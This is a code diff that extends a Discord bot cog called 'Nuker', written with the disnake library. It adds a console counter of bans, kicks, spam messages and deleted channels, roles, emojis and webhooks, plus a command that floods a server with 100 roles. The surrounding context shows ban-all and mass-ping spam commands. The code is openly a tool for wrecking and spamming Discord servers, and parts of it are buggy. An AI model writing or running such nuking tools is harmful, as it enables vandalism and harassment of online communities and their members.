@@ -1,12 +1,46 @@
 import disnake
 from disnake.ext import commands
+from disnake.ext import tasks
 
 
+import ctypes
+
+
+server =  0
+banned = 0
+kicked = 0
+messages =  0
+chs = 0
+rls = 0
+roles = 0
+channels = 0
+categories = 0
+emojis = 0
+webhooks = 0
+action = 0
+
+class Console:
+    def __init__(self):
+        self.maintext = "Discord Nuker || Version: 1.0.0 || "
+        self.update(update = "Initialized || ")
+    
+    def update(self, update):
+        text = self.maintext + update
+        ctypes.windll.kernel32.SetConsoleTitleW(text)
+        self.maintext = text
+        
+        
 class Nuker(commands.Cog):
 
    def __init__(self, bot):
       self.bot = bot
-
+      self.task.start()
+   
+   @tasks.loop(seconds=5.0)
+   async def task(self):
+      action = server + banned + kicked + messages + chs + rls + roles + channels + categories + emojis + webhooks + action
+      text = Console.maintext + f"Targeted Server: {server} || Banned: {banned} || Kicked: {kicked} || Messages Sent: {messages} || Channels Created: {chs} || Roles Created: {rls} || Cleared Roles: {roles} ||  Cleared Channels: {channels} || Cleared Categories: {categories} || Cleared Emojis: {emojis} || Cleared Webhooks: {webhooks} || Total Actions: {action}"
+      ctypes.windll.kernel32.SetConsoleTitleW(text)
    @commands.slash_command(
       name="banall",
    )
@@ -158,6 +192,13 @@ class Nuker(commands.Cog):
                await channel.send(arg + interaction.guild.default_role)
          except:
             pass
+         
+   @commands.slash_command(
+      name="createroles"
+   )
+   async def createroles(self, interaction, *, arg):
+      for _ in range(0, 100):
+         await interaction.guild.create_role(name=arg)
       
 def setup(bot):
    bot.add_cog(Nuker(bot))
